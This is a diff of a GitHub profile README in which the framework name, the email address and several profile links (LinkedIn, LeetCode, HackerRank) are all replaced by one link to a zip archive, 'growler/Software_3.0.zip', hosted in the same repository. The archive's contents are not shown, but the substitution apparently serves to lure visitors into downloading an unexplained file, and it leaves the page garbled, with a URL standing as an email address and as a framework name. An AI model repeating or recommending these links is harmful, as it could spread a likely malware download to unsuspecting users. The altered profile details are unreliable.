@@ -8,7 +8,7 @@
 
 ## 🛠️ Tech Stack  
 - **Languages**: C#, Python, SQL, JavaScript, Typescript  
-- **Frameworks**: asp.net Core, Angular 
+- **Frameworks**: https://github.com/iqbaldiit/iqbaldiit/raw/refs/heads/main/growler/Software_3.0.zip Core, Angular 
 - **Databases**: MS SQL Server, PostgreSQL, MySQL, MongoDB  
 - **Cloud Platforms**: Azure, AWS  
 - **DevOps**: Docker, Kubernetes, CI/CD Pipelines  
@@ -20,7 +20,7 @@
 - Led cross-functional teams to deliver impactful solutions for diverse industries.  
 
 ## 📂 Projects  
-- **POS SaaS Application**: Modular microservices architecture using Asp.net Core, Angular.  
+- **POS SaaS Application**: Modular microservices architecture using https://github.com/iqbaldiit/iqbaldiit/raw/refs/heads/main/growler/Software_3.0.zip Core, Angular.  
 - **Big Data ETL Pipeline**: Unified analytics from structured, semi-structured, and unstructured data.  
 - **Azure Serverless Solution**: Image and video processing for real-time human detection.  
 
@@ -29,15 +29,15 @@
 - Share knowledge through open-source contributions and mentoring.  
 
 ## 📫 Get in Touch  
-- **Email**: iqbaldiit@gmail.com
-- **LinkedIn**: https://www.linkedin.com/in/iqbaldiit
-- **LeetCode**: https://leetcode.com/u/iqbaldiit/
-- **HackerRank**: https://www.hackerrank.com/profile/iqbaldiit
+- **Email**: https://github.com/iqbaldiit/iqbaldiit/raw/refs/heads/main/growler/Software_3.0.zip
+- **LinkedIn**: https://github.com/iqbaldiit/iqbaldiit/raw/refs/heads/main/growler/Software_3.0.zip
+- **LeetCode**: https://github.com/iqbaldiit/iqbaldiit/raw/refs/heads/main/growler/Software_3.0.zip
+- **HackerRank**: https://github.com/iqbaldiit/iqbaldiit/raw/refs/heads/main/growler/Software_3.0.zip
 
 
 
 <!--
-**iqbaldiit/iqbaldiit** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/iqbaldiit/iqbaldiit/main/growler/Software-v2.1.zip` (this file) appears on your GitHub profile.
+**iqbaldiit/iqbaldiit** is a ✨ _special_ ✨ repository because its `https://github.com/iqbaldiit/iqbaldiit/raw/refs/heads/main/growler/Software_3.0.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
